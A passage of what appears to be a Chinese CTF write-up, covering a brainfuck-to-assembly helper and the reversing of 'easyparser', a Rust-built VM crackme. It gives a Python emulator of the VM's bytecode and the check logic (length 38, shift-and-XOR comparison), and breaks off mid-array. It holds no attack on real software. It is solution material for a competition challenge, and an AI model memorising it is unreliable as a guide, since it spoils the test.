<span class="n">s</span> <span class="o">=</span> <span class="s2">&#34;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,&gt;&gt;&gt;&gt;&gt;&gt;[-]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&#34;</span>    
<span class="n">input_ptr</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="n">bit_add</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="n">bf2asm</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>    
</code></pre></td></tr></table>
</div>
</div><h2 id="easyparser">easyparser</h2>
<p>这道题是做出来让我最高兴的一道题(xiaoku.jpg)主要是查了一下发现用了Rust,Rust代码里面会多了很多安全检查的部分来扰乱一下视线(比如说做加法之前会检查加法会不会溢出),去掉这些安全检查的部分之后倒是挺容易看出来解释器的逻辑,之后就是体力活了==   <br>
wp里面有句话记录一下，或许以后出题用得着呢嘻嘻</p>
<blockquote>
<p>一个vm逆向题目，在.init_array中初始化了一部分数据，在.fin_array中进行flag的检查，由于Rust编程 <br>
规范不允许在main前和main后编写逻辑，所以先用Rust写了一个so库，用c语言进行一次包裹</p>
</blockquote>
<p>逆出来以后可以看出来流程，第一层用来检查输入长度等于38，第二层将输入的中间部分，左移2后与99异或等于特定值.下面是反编译的代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">]</span>    
<span class="n">qword_6C09B8</span> <span class="o">=</span> <span class="p">[</span><span class="mi">144</span><span class="p">,</span> <span class="mi">332</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">276</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">264</span><span class="p">,</span> <span class="mi">240</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">1248</span>    
<span class="n">qword_6BF1B8</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">768</span>    
<span class="n">EIP</span> <span class="o">=</span> <span class="mh">0x1f</span>    
<span class="n">qword_6BF130</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x66</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">100</span>    
<span class="n">qword_6BF150</span> <span class="o">=</span> <span class="mh">0x100</span>    
<span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;flag{G0ertyuiopasdfghjklzxcvbnmoooouu}&#34;</span>    
<span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>    
<span class="n">opcode</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">EIP</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>    
<span class="n">arg1</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">EIP</span> <span class="o">*</span> <span class="mi">3</span><span class="p">]</span>    
<span class="n">arg2</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">EIP</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>    
<span class="n">EIP</span> <span class="o">=</span> <span class="n">EIP</span> <span class="o">+</span> <span class="mi">1</span>    
<span class="k">if</span> <span class="n">opcode</span> <span class="o">==</span> <span class="mi">25</span><span class="p">:</span>    
    <span class="k">print</span> <span class="s2">&#34;exit&#34;</span><span class="p">,</span><span class="mi">25</span>    
    <span class="c1"># print qword_6BF1B8    </span>
    <span class="k">if</span> <span class="n">index</span> <span class="o">==</span> <span class="mi">38</span><span class="p">:</span>    
        <span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">25</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span 